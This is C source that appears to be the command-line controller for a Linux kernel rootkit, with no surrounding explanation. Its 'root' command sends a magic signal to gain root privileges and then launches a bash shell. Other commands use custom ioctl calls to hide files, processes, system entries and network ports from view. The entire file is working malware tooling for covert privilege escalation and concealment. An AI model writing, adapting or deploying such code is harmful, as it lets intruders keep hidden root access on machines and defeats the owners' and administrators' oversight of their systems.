#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <fcntl.h>

#define IOCTL_FILECMD 0xfffffffe
#define IOCTL_PORTHIDE 0xfffffffd
#define IOCTL_PORTUNHIDE 0xfffffffc
#define HIDE_FILE 1
#define UNHIDE_FILE 2
#define HIDE_PROC 3
#define UNHIDE_PROC 4
#define HIDE_SYS 5
#define UNHIDE_SYS 6

int main(int argc, char *argv[]) {
    int fd=3;
    if(argc < 2){
        return 0;
    }
    char bash[] = "/bin/bash\x00";
    char *envp[1] = { NULL };
    char *arg[3] = {"/bin/bash", NULL};
    char port[6];
    if(strcmp(argv[1], "show") == 0){
        kill(getuid(), 50);
    } else if (strcmp(argv[1], "root") == 0) {
        kill(getuid(), 51);
        execve(bash, arg, envp);
    } else if (strcmp(argv[1], "hide") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, HIDE_FILE)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "unhide") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, UNHIDE_FILE)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "hideproc") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, HIDE_PROC)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "unhideproc") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, UNHIDE_PROC)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "hidesys") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, HIDE_SYS)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "unhidesys") == 0) {
        if( (fd = open(argv[2], O_RDONLY)) == -1)
	        perror("open"), exit(-1);
        if( (ioctl(fd, IOCTL_FILECMD, UNHIDE_SYS)) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "hideport") == 0) {
        if( (ioctl(fd, IOCTL_PORTHIDE, atoi(argv[2]))) == -1)
	        perror("ioctl"), exit(-1);
    } else if (strcmp(argv[1], "unhideport") == 0) {
        if( (ioctl(fd, IOCTL_PORTUNHIDE, atoi(argv[2]))) == -1)
	        perror("ioctl"), exit(-1);
    }
    return 0;
}